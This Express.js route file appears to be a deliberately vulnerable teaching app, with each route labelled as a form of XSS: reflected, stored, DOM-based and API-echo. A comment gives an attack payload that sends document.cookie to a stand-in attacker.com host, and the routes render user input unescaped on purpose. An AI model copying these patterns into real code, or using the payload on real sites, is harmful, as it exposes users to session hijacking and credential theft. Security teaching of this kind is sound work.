const express = require('express');
const router = express.Router();

/*
 * VULNERABILITY: Cross-Site Scripting (XSS)
 * OWASP: A03:2021 - Injection
 * CWE-79: Improper Neutralization of Input During Web Page Generation
 * 
 * Risk Level: HIGH
 * 
 * Attack Vector:
 * <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
 * 
 * Business Impact:
 * - Session hijacking
 * - Credential theft
 * - Defacement
 * - Malware distribution
 */

router.get('/search', (req, res) => {
  const searchTerm = req.query.q || '';
  
  const htmlResponse = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Search Results</title>
    </head>
    <body>
      <h1>Search Results</h1>
      <p>You searched for: ${searchTerm}</p>
      <div id="results">
        <p>Showing results for "${searchTerm}"</p>
      </div>
    </body>
    </html>
  `;
  
  res.send(htmlResponse);
});

/*
 * VULNERABILITY: Reflected XSS via API
 */

router.get('/api/search', (req, res) => {
  const { query } = req.query;
  
  res.json({
    success: true,
    query: query,
    message: `Search completed for: ${query}`,
    results: []
  });
});

/*
 * VULNERABILITY: Stored XSS (Persistent)
 * 
 * This is more dangerous as the malicious script is saved to database
 * and executed every time the page is loaded
 */

const comments = [];

router.post('/comment', (req, res) => {
  const { username, comment } = req.body;
  
  comments.push({
    id: comments.length + 1,
    username: username,
    comment: comment,
    timestamp: new Date().toISOString()
  });
  
  res.json({
    success: true,
    message: 'Comment added successfully'
  });
});

router.get('/comments', (req, res) => {
  let html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Comments</title>
    </head>
    <body>
      <h1>User Comments</h1>
      <div id="comments">
  `;
  
  comments.forEach(comment => {
    html += `
      <div class="comment">
        <strong>${comment.username}</strong>: ${comment.comment}
        <br>
        <small>${comment.timestamp}</small>
      </div>
      <hr>
    `;
  });
  
  html += `
      </div>
    </body>
    </html>
  `;
  
  res.send(html);
});

/*
 * VULNERABILITY: DOM-based XSS
 */

router.get('/dashboard', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>User Dashboard</title>
    </head>
    <body>
      <h1>Welcome, <span id="username"></span></h1>
      
      <script>
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('user');
        document.getElementById('username').innerHTML = username;
      </script>
    </body>
    </html>
  `;
  
  res.send(html);
});

/*
 * VULNERABILITY: XSS via JSON Response (when rendered client-side)
 */

router.get('/api/profile', (req, res) => {
  const { userId } = req.query;
  
  res.json({
    success: true,
    profile: {
      id: userId,
      name: req.query.name || 'Unknown',
      bio: req.query.bio || 'No bio provided',
      website: req.query.website || ''
    }
  });
});

module.exports = router;